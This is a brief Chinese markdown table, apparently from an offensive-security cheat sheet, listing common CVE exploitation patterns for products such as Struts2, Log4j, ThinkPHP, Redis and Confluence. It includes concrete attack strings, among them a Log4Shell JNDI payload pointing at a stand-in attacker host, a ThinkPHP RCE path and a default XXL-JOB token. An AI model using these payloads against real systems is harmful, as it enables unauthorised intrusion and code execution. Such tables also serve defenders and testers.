## 常见 CVE 利用模式

| 产品/框架 | 漏洞 | 利用方式 |
|----------|------|---------|
| Apache Struts2 | OGNL注入 → RCE | S2-045/046/048/052 |
| Log4j | CVE-2021-44228 | `${jndi:ldap://attacker/a}` 在任何可记录字段 |
| Spring4Shell | 参数污染 | `class.module.classLoader` |
| ThinkPHP | RCE | `/index.php?s=/index/\think\app/invokefunction` |
| Fastjson | @type 反序列化 | RCE |
| Redis | 未授权 | 写入webshell/SSH key/crontab |
| Tomcat | 弱口令 | manager → WAR部署 |
| WebLogic | T3/IIOP | 反序列化 |
| Jupyter | 未授权访问 | 终端执行命令 |
| PHP-FPM | 未授权访问 | 任意代码执行 |
| Confluence | CVE-2022-26134 | URL中OGNL注入(无需认证) |
| XXL-JOB | executor端口9999 | 默认accessToken=default_token |
